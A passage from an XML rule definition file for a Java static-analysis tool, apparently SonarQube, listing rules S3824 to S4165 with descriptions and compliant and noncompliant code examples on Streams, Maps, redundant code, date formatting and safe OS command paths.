            &amp;lt;!-- Property deleted --&amp;gt;
            &amp;lt;/session-factory&amp;gt;
            &lt;/pre&gt;
        </description>
        <tag>hibernate</tag>
        <tag>sql</tag>
    </rule>

    <rule key='S3824' priority='MAJOR'>
        <configKey>S3824</configKey>
        <name>&quot;Map.get&quot; and value test should be replaced with single method call</name>
        <description>
            &lt;p&gt;It's a common pattern to test the result of a &lt;code&gt;java.util.Map.get()&lt;/code&gt; against
            &lt;code&gt;null&lt;/code&gt; or calling
            &lt;code&gt;java.util.Map.containsKey()&lt;/code&gt; before proceeding with adding or changing the value in
            the map. However the &lt;code&gt;java.util.Map&lt;/code&gt; API
            offers a significantly better alternative in the form of the &lt;code&gt;computeIfPresent()&lt;/code&gt; and
            &lt;code&gt;computeIfAbsent()&lt;/code&gt; methods. Using these
            instead leads to cleaner and more readable code.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is not 8.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            V value = map.get(key);
            if (value == null) { // Noncompliant
            value = V.createFor(key);
            if (value != null) {
            map.put(key, value);
            }
            }
            if (!map.containsKey(key)) { // Noncompliant
            value = V.createFor(key);
            if (value != null) {
            map.put(key, value);
            }
            }
            return value;
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            return map.computeIfAbsent(key, k -&amp;gt; V.createFor(k));
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule will not raise an issue when trying to add &lt;code&gt;null&lt;/code&gt; to a map,
            because &lt;code&gt;computeIfAbsent&lt;/code&gt; will not add the entry if the
            value returned by the function is &lt;code&gt;null&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;See also&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href='/coding_rules#rule_key=java%3AS6104'&gt;S6104&lt;/a&gt; - Map &quot;computeIfAbsent()&quot;
            and &quot;computeIfPresent()&quot; should not be used to add &quot;null&quot; values. &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S3864' priority='MAJOR'>
        <configKey>S3864</configKey>
        <name>&quot;Stream.peek&quot; should be used with caution</name>
        <description>
            &lt;p&gt;According to its JavaDocs, the intermediate Stream operation &lt;code&gt;java.util.Stream.peek()&lt;/code&gt;
            “exists mainly to support debugging”
            purposes.&lt;/p&gt;
            &lt;p&gt;A key difference with other intermediate Stream operations is that the Stream implementation is
            free to skip calls to &lt;code&gt;peek()&lt;/code&gt; for
            optimization purpose. This can lead to &lt;code&gt;peek()&lt;/code&gt; being unexpectedly called only for
            some or none of the elements in the Stream.&lt;/p&gt;
            &lt;p&gt;As a consequence, relying on &lt;code&gt;peek()&lt;/code&gt; without careful consideration can lead
            to error-prone code.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue for each use of peek() to be sure that it is challenged and validated by
            the team to be meant for production
            debugging/logging purposes.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Stream.of(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, &quot;four&quot;)
            .filter(e -&amp;gt; e.length() &amp;gt; 3)
            .peek(e -&amp;gt; System.out.println(&quot;Filtered value: &quot; + e)); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Stream.of(&quot;one&quot;, &quot;two&quot;, &quot;three&quot;, &quot;four&quot;)
            .filter(e -&amp;gt; e.length() &amp;gt; 3)
            .foreach(e -&amp;gt; System.out.println(&quot;Filtered value: &quot; + e));
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-&quot;&gt;Java
            8 API Documentation&lt;/a&gt;
            &lt;/li&gt;
            &lt;li&gt; 4comprehension: &lt;a href=&quot;https://4comprehension.com/idiomatic-peeking/&quot;&gt;Idiomatic
            Peeking with Java Stream API&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; Data Geekery: &lt;a href=&quot;https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/&quot;&gt;10
            Subtle Mistakes When
            Using the Streams API&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java8</tag>
        <tag>pitfall</tag>
    </rule>

    <rule key='S3878' priority='MINOR'>
        <configKey>S3878</configKey>
        <name>Arrays should not be created for varargs parameters</name>
        <description>
            &lt;p&gt;There's no point in creating an array solely for the purpose of passing it as a varargs (&lt;code&gt;...&lt;/code&gt;)
            argument; varargs &lt;em&gt;is&lt;/em&gt; an array.
            Simply pass the elements directly. They will be consolidated into an array automatically. Incidentally
            passing an array where &lt;code&gt;Object ...&lt;/code&gt;
            is expected makes the intent ambiguous: Is the array supposed to be one object or a collection of objects?&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void callTheThing() {
            //...
            doTheThing(new String[] { &quot;s1&quot;, &quot;s2&quot;}); // Noncompliant: unnecessary
            doTheThing(new String[12]); // Compliant
            doTheOtherThing(new String[8]); // Noncompliant: ambiguous
            // ...
            }

            public void doTheThing (String ... args) {
            // ...
            }

            public void doTheOtherThing(Object ... args) {
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void callTheThing() {
            //...
            doTheThing(&quot;s1&quot;, &quot;s2&quot;);
            doTheThing(new String[12]);
            doTheOtherThing((Object[]) new String[8]);
            // ...
            }

            public void doTheThing (String ... args) {
            // ...
            }

            public void doTheOtherThing(Object ... args) {
            // ...
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S3923' priority='MAJOR'>
        <configKey>S3923</configKey>
        <name>All branches in a conditional structure should not have exactly the same implementation</name>
        <description>
            &lt;p&gt;Having all branches in a &lt;code&gt;switch&lt;/code&gt; or &lt;code&gt;if&lt;/code&gt; chain with
            the same implementation is an error. Either a copy-paste error was made
            and something different should be executed, or there shouldn't be a &lt;code&gt;switch&lt;/code&gt;/&lt;code&gt;if&lt;/code&gt;
            chain at all.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (b == 0) { // Noncompliant
            doOneMoreThing();
            } else {
            doOneMoreThing();
            }

            int b = a &amp;gt; 12 ? 4 : 4; // Noncompliant

            switch (i) { // Noncompliant
            case 1:
            doSomething();
            break;
            case 2:
            doSomething();
            break;
            case 3:
            doSomething();
            break;
            default:
            doSomething();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule does not apply to &lt;code&gt;if&lt;/code&gt; chains without &lt;code&gt;else&lt;/code&gt;-s,
            or to &lt;code&gt;switch&lt;/code&gt;-es without &lt;code&gt;default&lt;/code&gt;
            clauses.&lt;/p&gt;
            &lt;pre&gt;
            if(b == 0) { //no issue, this could have been done on purpose to make the code more readable
            doSomething();
            } else if(b == 1) {
            doSomething();
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S3958' priority='MAJOR'>
        <configKey>S3958</configKey>
        <name>Intermediate Stream methods should not be left unused</name>
        <description>
            &lt;p&gt;There are two types of stream operations: intermediate operations, which return another stream, and
            terminal operations, which return something
            other than a stream. Intermediate operations are lazy, meaning they aren't actually executed until and
            unless a terminal stream operation is performed
            on their results. Consequently if the result of an intermediate stream operation is not fed to a terminal
            operation, it serves no purpose, which is
            almost certainly an error.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            widgets.stream().filter(b -&amp;gt; b.getColor() == RED); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            int sum = widgets.stream()
            .filter(b -&amp;gt; b.getColor() == RED)
            .mapToInt(b -&amp;gt; b.getWeight())
            .sum();
            Stream&amp;lt;Widget&amp;gt; pipeline = widgets.stream()
            .filter(b -&amp;gt; b.getColor() == GREEN)
            .mapToInt(b -&amp;gt; b.getWeight());
            sum = pipeline.sum();
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps&quot;&gt;Stream
            Operations&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S3959' priority='MAJOR'>
        <configKey>S3959</configKey>
        <name>Consumed Stream pipelines should not be reused</name>
        <description>
            &lt;p&gt;Stream operations are divided into intermediate and terminal operations, and are combined to form
            stream pipelines. After the terminal operation is
            performed, the stream pipeline is considered consumed, and cannot be used again. Such a reuse will yield
            unexpected results.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Stream&amp;lt;Widget&amp;gt; pipeline = widgets.stream().filter(b -&amp;gt; b.getColor() == RED);
            int sum1 = pipeline.sum();
            int sum2 = pipeline.mapToInt(b -&amp;gt; b.getWeight()).sum(); // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;p&gt;&lt;a href=&quot;https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps&quot;&gt;Stream
            Operations&lt;/a&gt;&lt;/p&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S3972' priority='CRITICAL'>
        <configKey>S3972</configKey>
        <name>Conditionals should start on new lines</name>
        <description>
            &lt;p&gt;Code is clearest when each statement has its own line. Nonetheless, it is a common pattern to
            combine on the same line an &lt;code&gt;if&lt;/code&gt; and its
            resulting &lt;em&gt;then&lt;/em&gt; statement. However, when an &lt;code&gt;if&lt;/code&gt; is placed on the
            same line as the closing &lt;code&gt;}&lt;/code&gt; from a preceding
            &lt;em&gt;then&lt;/em&gt;, &lt;em&gt;else&lt;/em&gt; or &lt;em&gt;else if&lt;/em&gt; part, it is either an
            error - &lt;code&gt;else&lt;/code&gt; is missing - or the invitation to a future error as
            maintainers fail to understand that the two statements are unconnected.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (condition1) {
            // ...
            } if (condition2) { // Noncompliant
            //...
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (condition1) {
            // ...
            } else if (condition2) {
            //...
            }
            &lt;/pre&gt;
            &lt;p&gt;Or&lt;/p&gt;
            &lt;pre&gt;
            if (condition1) {
            // ...
            }

            if (condition2) {
            //...
            }
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S3973' priority='CRITICAL'>
        <configKey>S3973</configKey>
        <name>A conditionally executed single line should be denoted by indentation</name>
        <description>
            &lt;p&gt;In the absence of enclosing curly braces, the line immediately after a conditional is the one that
            is conditionally executed. By both convention
            and good practice, such lines are indented. In the absence of both curly braces and indentation the intent
            of the original programmer is entirely
            unclear and perhaps not actually what is executed. Additionally, such code is highly likely to be confusing
            to maintainers.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (condition) // Noncompliant
            doTheThing();

            doTheOtherThing();
            somethingElseEntirely();

            foo();
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (condition)
            doTheThing();

            doTheOtherThing();
            somethingElseEntirely();

            foo();
            &lt;/pre&gt;
        </description>
        <tag>confusing</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S3981' priority='MAJOR'>
        <configKey>S3981</configKey>
        <name>Collection sizes and array length comparisons should make sense</name>
        <description>
            &lt;p&gt;The size of a collection and the length of an array are always greater than or equal to zero. So
            testing that a size or length is greater than or
            equal to zero doesn't make sense, since the result is always &lt;code&gt;true&lt;/code&gt;. Similarly
            testing that it is less than zero will always return
            &lt;code&gt;false&lt;/code&gt;. Perhaps the intent was to check the non-emptiness of the collection or array
            instead. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (myList.size() &amp;gt;= 0) { ... }

            if (myList.size() &amp;lt; 0) { ... }

            boolean result = myArray.length &amp;gt;= 0;

            if (0 &amp;gt; myArray.length) { ... }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (!myList.isEmpty()) { ... }

            if (myArray.length &amp;gt;= 42) { ... }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S3984' priority='MAJOR'>
        <configKey>S3984</configKey>
        <name>Exceptions should not be created without being thrown</name>
        <description>
            &lt;p&gt;Creating a new &lt;code&gt;Throwable&lt;/code&gt; without actually throwing it is useless and is
            probably due to a mistake.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if (x &amp;lt; 0)
            new IllegalArgumentException(&quot;x must be nonnegative&quot;);
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if (x &amp;lt; 0)
            throw new IllegalArgumentException(&quot;x must be nonnegative&quot;);
            &lt;/pre&gt;
        </description>
        <tag>error-handling</tag>
    </rule>

    <rule key='S3985' priority='MAJOR'>
        <configKey>S3985</configKey>
        <name>Unused &quot;private&quot; classes should be removed</name>
        <description>
            &lt;p&gt;&lt;code&gt;private&lt;/code&gt; classes that are never used are dead code: unnecessary,
            inoperative code that should be removed. Cleaning out dead code
            decreases the size of the maintained codebase, making it easier to understand the program and preventing
            bugs from being introduced.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo
            {
            ...
            private class MyUnusedPrivateClass {...} // Noncompliant
            }
            &lt;/pre&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S3986' priority='MAJOR'>
        <configKey>S3986</configKey>
        <name>Week Year (&quot;YYYY&quot;) should not be used for date formatting</name>
        <description>
            &lt;p&gt;Few developers are aware of the difference between &lt;code&gt;Y&lt;/code&gt; for &quot;Week year&quot;
            and &lt;code&gt;y&lt;/code&gt; for Year when formatting and parsing a date
            with &lt;code&gt;SimpleDateFormat&lt;/code&gt; or &lt;code&gt;DateTimeFormatter&lt;/code&gt;. That's likely
            because for most dates, Week year and Year are the same, so
            testing at any time other than the first or last week of the year will yield the same value for both &lt;code&gt;y&lt;/code&gt;
            and &lt;code&gt;Y&lt;/code&gt;. But in the
            last week of December and the first week of January, you may get unexpected results.&lt;/p&gt;
            &lt;p&gt;According to the &lt;a href=&quot;http://docs.oracle.com/javase/8/docs/api/java/util/GregorianCalendar.html#week_year&quot;&gt;Javadoc&lt;/a&gt;:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;A week year is in sync with a WEEK_OF_YEAR cycle. All weeks between the first and last weeks
            (inclusive) have the same week year value.
            Therefore, the first and last days of a week year may have different calendar year values.&lt;/p&gt;
            &lt;p&gt;For example, January 1, 1998 is a Thursday. If getFirstDayOfWeek() is MONDAY and
            getMinimalDaysInFirstWeek() is 4 (ISO 8601 standard compatible
            setting), then week 1 of 1998 starts on December 29, 1997, and ends on January 4, 1998. The week year is
            1998 for the last three days of calendar
            year 1997. If, however, getFirstDayOfWeek() is SUNDAY, then week 1 of 1998 starts on January 4, 1998, and
            ends on January 10, 1998; the first three
            days of 1998 then are part of week 53 of 1997 and their week year is 1997.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Date date = new SimpleDateFormat(&quot;yyyy/MM/dd&quot;).parse(&quot;2015/12/31&quot;);
            String result = new SimpleDateFormat(&quot;YYYY/MM/dd&quot;).format(date); //Noncompliant; yields
            '2016/12/31'
            result = DateTimeFormatter.ofPattern(&quot;YYYY/MM/dd&quot;).format(date); //Noncompliant; yields
            '2016/12/31'
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Date date = new SimpleDateFormat(&quot;yyyy/MM/dd&quot;).parse(&quot;2015/12/31&quot;);
            String result = new SimpleDateFormat(&quot;yyyy/MM/dd&quot;).format(date); //Yields '2015/12/31' as expected
            result = DateTimeFormatter.ofPattern(&quot;yyyy/MM/dd&quot;).format(date); //Yields '2015/12/31' as expected
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;pre&gt;
            Date date = new SimpleDateFormat(&quot;yyyy/MM/dd&quot;).parse(&quot;2015/12/31&quot;);
            String result = new SimpleDateFormat(&quot;YYYY-ww&quot;).format(date); //compliant, 'Week year' is used
            along with 'Week of year'. result = '2016-01'
            DateTimeFormatter.ofPattern(&quot;YYYY-ww&quot;).format(date); //compliant; yields '2016-01' as expected
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S4032' priority='MINOR'>
        <configKey>S4032</configKey>
        <name>Packages containing only &quot;package-info.java&quot; should be removed</name>
        <description>
            &lt;p&gt;There is no reason to have a package that is empty except for &quot;package-info.java&quot;. Such
            packages merely clutter a project, taking up space but
            adding no value. &lt;/p&gt;
        </description>
        <tag>unused</tag>
    </rule>

    <rule key='S4034' priority='MINOR'>
        <configKey>S4034</configKey>
        <name>&quot;Stream&quot; call chains should be simplified when possible</name>
        <description>
            &lt;p&gt;When using the &lt;code&gt;Stream&lt;/code&gt; API, call chains should be simplified as much as
            possible. Not only does it make the code easier to read, it
            also avoid creating unnecessary temporary objects.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when one of the following substitution is possible:&lt;/p&gt;
            &lt;table&gt;
            &lt;tbody&gt;
            &lt;tr&gt;
            &lt;th&gt;Original&lt;/th&gt;
            &lt;th&gt;Preferred&lt;/th&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;stream.filter(predicate).findFirst().isPresent()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;stream.anyMatch(predicate)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;stream.filter(predicate).findAny().isPresent()&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;stream.anyMatch(predicate)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;!stream.anyMatch(predicate)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;stream.noneMatch(predicate)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;!stream.anyMatch(x -&amp;gt; !(...))&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;stream.allMatch(...)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
            &lt;td&gt;&lt;code&gt;stream.map(mapper).anyMatch(Boolean::booleanValue)&lt;/code&gt;&lt;/td&gt;
            &lt;td&gt;&lt;code&gt;stream.anyMatch(predicate)&lt;/code&gt;&lt;/td&gt;
            &lt;/tr&gt;
            &lt;/tbody&gt;
            &lt;/table&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            boolean hasRed = widgets.stream().filter(w -&amp;gt; w.getColor() == RED).findFirst().isPresent(); //
            Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            boolean hasRed = widgets.stream().anyMatch(w -&amp;gt; w.getColor() == RED);
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S4036' priority='MINOR'>
        <configKey>S4036</configKey>
        <name>Searching OS commands in PATH is security-sensitive</name>
        <description>
            &lt;p&gt;When executing an OS command and unless you specify the full path to the executable, then the
            locations in your application's &lt;code&gt;PATH&lt;/code&gt;
            environment variable will be searched for the executable. That search could leave an opening for an attacker
            if one of the elements in
            &lt;code&gt;PATH&lt;/code&gt; is a directory under his control. &lt;/p&gt;
            &lt;h2&gt;Ask Yourself Whether&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; The directories in the PATH environment variable may be defined by not trusted entities. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;There is a risk if you answered yes to this question.&lt;/p&gt;
            &lt;h2&gt;Recommended Secure Coding Practices&lt;/h2&gt;
            &lt;p&gt;Fully qualified/absolute path should be used to specify the OS command to execute.&lt;/p&gt;
            &lt;h2&gt;Sensitive Code Example&lt;/h2&gt;
            &lt;p&gt;The full path of the command is not specified and thus the executable will be searched in all
            directories listed in the &lt;code&gt;PATH&lt;/code&gt;
            environment variable:&lt;/p&gt;
            &lt;pre&gt;
            Runtime.getRuntime().exec(&quot;make&quot;); // Sensitive
            Runtime.getRuntime().exec(new String[]{&quot;make&quot;}); // Sensitive

            ProcessBuilder builder = new ProcessBuilder(&quot;make&quot;); // Sensitive
            builder.command(&quot;make&quot;); // Sensitive
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;p&gt;The command is defined by its full path:&lt;/p&gt;
            &lt;pre&gt;
            Runtime.getRuntime().exec(&quot;/usr/bin/make&quot;); // Compliant
            Runtime.getRuntime().exec(new String[]{&quot;~/bin/make&quot;}); // Compliant

            ProcessBuilder builder = new ProcessBuilder(&quot;./bin/make&quot;); // Compliant
            builder.command(&quot;../bin/make&quot;); // Compliant
            builder.command(Arrays.asList(&quot;..\bin\make&quot;, &quot;-j8&quot;)); // Compliant

            builder = new ProcessBuilder(Arrays.asList(&quot;.\make&quot;)); // Compliant
            builder.command(Arrays.asList(&quot;C:\bin\make&quot;, &quot;-j8&quot;)); // Compliant
            builder.command(Arrays.asList(&quot;\\SERVER\bin\make&quot;)); // Compliant
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.owasp.org/index.php/Top_10-2017_A1-Injection&quot;&gt;OWASP Top 10
            2017 Category A1&lt;/a&gt; - Injection &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/426.html&quot;&gt;MITRE, CWE-426&lt;/a&gt;
            - Untrusted Search Path &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/427.html&quot;&gt;MITRE, CWE-427&lt;/a&gt;
            - Uncontrolled Search Path Element &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>owasp-a1</tag>
        <securityStandards>
            <OWASP>A1</OWASP>
        </securityStandards>
    </rule>

    <rule key='S4042' priority='MAJOR'>
        <configKey>S4042</configKey>
        <name>&quot;java.nio.Files#delete&quot; should be preferred</name>
        <description>
            &lt;p&gt;When &lt;code&gt;java.io.File#delete&lt;/code&gt; fails, this &lt;code&gt;boolean&lt;/code&gt;
            method simply returns &lt;code&gt;false&lt;/code&gt; with no indication of the cause. On
            the other hand, when &lt;code&gt;java.nio.file.Files#delete&lt;/code&gt; fails, this &lt;code&gt;void&lt;/code&gt;
            method returns one of a series of exception types to better
            indicate the cause of the failure. And since more information is generally better in a debugging situation,
            &lt;code&gt;java.nio.file.Files#delete&lt;/code&gt; is
            the preferred option.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void cleanUp(Path path) {
            File file = new File(path);
            if (!file.delete()) { // Noncompliant
            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void cleanUp(Path path) throws NoSuchFileException, DirectoryNotEmptyException, IOException {
            Files.delete(path);
            }
            &lt;/pre&gt;
        </description>
        <tag>api-design</tag>
        <tag>error-handling</tag>
    </rule>

    <rule key='S4065' priority='MINOR'>
        <configKey>S4065</configKey>
        <name>&quot;ThreadLocal.withInitial&quot; should be preferred</name>
        <description>
            &lt;p&gt;Java 8 introduced &lt;code&gt;ThreadLocal.withInitial&lt;/code&gt; which is a simpler alternative
            to creating an anonymous inner class to initialise a
            &lt;code&gt;ThreadLocal&lt;/code&gt; instance.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when a &lt;code&gt;ThreadLocal&lt;/code&gt; anonymous inner class can be
            replaced by a call to
            &lt;code&gt;ThreadLocal.withInitial&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            ThreadLocal&amp;lt;List&amp;lt;String&amp;gt;&amp;gt; myThreadLocal =
            new ThreadLocal&amp;lt;List&amp;lt;String&amp;gt;&amp;gt;() { // Noncompliant
            @Override
            protected List&amp;lt;String&amp;gt; initialValue() {
            return new ArrayList&amp;lt;String&amp;gt;();
            }
            };
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            ThreadLocal&amp;lt;List&amp;lt;String&amp;gt;&amp;gt; myThreadLocal =
            ThreadLocal.withInitial(ArrayList::new);
            &lt;/pre&gt;
        </description>
        <tag>java8</tag>
    </rule>

    <rule key='S4087' priority='MINOR'>
        <configKey>S4087</configKey>
        <name>&quot;close()&quot; calls should not be redundant</name>
        <description>
            &lt;p&gt;Java 7's try-with-resources structure automatically handles closing the resources that the &lt;code&gt;try&lt;/code&gt;
            itself opens. Thus, adding an explicit
            &lt;code&gt;close()&lt;/code&gt; call is redundant and potentially confusing.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
            String contents = file.contents();
            writer.write(new Gson().toJson(new MyObject(contents)));
            writer.flush();
            writer.close(); // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            try (PrintWriter writer = new PrintWriter(process.getOutputStream())) {
            String contents = file.contents();
            writer.write(new Gson().toJson(new MyObject(contents)));
            writer.flush();
            }
            &lt;/pre&gt;
        </description>
        <tag>redundant</tag>
    </rule>

    <rule key='S4143' priority='MAJOR'>
        <configKey>S4143</configKey>
        <name>Map values should not be replaced unconditionally</name>
        <description>
            &lt;p&gt;It is highly suspicious when a value is saved for a key or index and then unconditionally
            overwritten. Such replacements are likely errors.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            letters.put(&quot;a&quot;, &quot;Apple&quot;);
            letters.put(&quot;a&quot;, &quot;Boy&quot;); // Noncompliant

            towns[i] = &quot;London&quot;;
            towns[i] = &quot;Chicago&quot;; // Noncompliant
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S4144' priority='MAJOR'>
        <configKey>S4144</configKey>
        <name>Methods should not have identical implementations</name>
        <description>
            &lt;p&gt;When two methods have the same implementation, either it was a mistake - something else was
            intended - or the duplication was intentional, but may
            be confusing to maintainers. In the latter case, one implementation should invoke the other. Numerical and
            string literals are not taken into account.
            &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            private final static String CODE = &quot;bounteous&quot;;

            public String calculateCode() {
            doTheThing();
            return CODE;
            }

            public String getName() { // Noncompliant
            doTheThing();
            return CODE;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            private final static String CODE = &quot;bounteous&quot;;

            public String getCode() {
            doTheThing();
            return CODE;
            }

            public String getName() {
            return getCode();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;Methods that are not accessors (getters and setters), with fewer than 2 statements are ignored.&lt;/p&gt;
        </description>
        <tag>confusing</tag>
        <tag>duplicate</tag>
        <tag>suspicious</tag>
    </rule>

    <rule key='S4165' priority='MAJOR'>
        <configKey>S4165</configKey>
        <name>Assignments should not be redundant</name>
        <description>
            &lt;p&gt;The transitive property says that if &lt;code&gt;a == b&lt;/code&gt; and &lt;code&gt;b == c&lt;/code&gt;,
            then &lt;code&gt;a == c&lt;/code&gt;. In such cases, there's no point in
            assigning &lt;code&gt;a&lt;/code&gt; to &lt;code&gt;c&lt;/code&gt; or vice versa because they're already
            equivalent. &lt;/p&gt;
            &lt;p&gt;This rule raises an issue when an assignment is useless because the assigned-to variable already
            holds the value on all execution paths.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            a = b;
            c = a;
            b = c; // Noncompliant: c and b are already the same
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            a = b;
            c = a;
            &lt;/pre&gt;
        </description>
        <tag>redundant</tag>
    </rule>

    <rule key='S4201' priority='MINOR'>
        <configKey>S4201</configKey>
        <name>Null checks should not be used with &quot;instanceof&quot;</name>
        <description>
